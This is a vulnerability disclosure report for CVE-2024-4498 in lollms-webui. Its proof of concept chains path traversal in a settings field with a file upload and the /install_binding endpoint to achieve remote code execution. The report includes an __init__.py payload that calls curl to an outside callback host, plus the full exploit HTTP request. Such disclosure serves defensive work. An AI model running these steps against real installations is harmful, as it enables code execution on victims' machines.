Title: Path Traversal + RFI vulnerability in parisneo/lollms-webui

Proof of Concept: 
Step 1: Access Settings, change discussion_db_name to installation path bindings_zoo - Here is "discussion_db_name":"../ ../../../Documents/lollms/lollms-webui/zoos/bindings_zoo/binding_template"

Step 2: Reset LLOLMS

Step 3: Create an __init__.py file with the following content:

import os

os.system('curl n0oq3kvqn508t84qhyrvrfaycpih67uw.oastify.com')

Step 4: Use the Send file to AL function, upload the newly created init.py file

Step 5: With /install_binding pointing the path to "name":"binding_template\\1\\text_data" ==> RCE successful

HTTP Request

POST /install_binding HTTP/1.1
Host: localhost:9600
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: application/json
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 41
Origin: http://localhost:9600
Connection: close
Referer: http://localhost:9600/settings/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"name":"binding_template\\1\\text_data"}

HTTP Response

HTTP/1.1 200 OK
date: Fri, 03 May 2024 19:38:10 GMT
server: uvicorn
content-length: 77
content-type: application/json
access-control-allow-credentials: true
access-control-allow-origin: http://localhost:9600
vary: Origin
connection: close

{"status":false,"error":"module 'text_data' has no attribute 'binding_name'"}

Impact: 
The attacker uploads malicious code to the victim's computer and conducts RCE

CVE ID: CVE-2024-4498
Status: (published)
Vulnerability Type: CWE-22: Path Traversal
Severity: High (7.7)
Attack Vector: Local
Attack Complexity: High
Privileges Required: None
User Interaction: Required
Scope: Changed
Confidentiality: High
Integrity: High
Availability: High
Registry: Other
Affected Version: v9.7 - Latest
Visibility: Public
Status: Awaiting fix
Disclosure Bounty: $450
Fix Bounty: $112.5
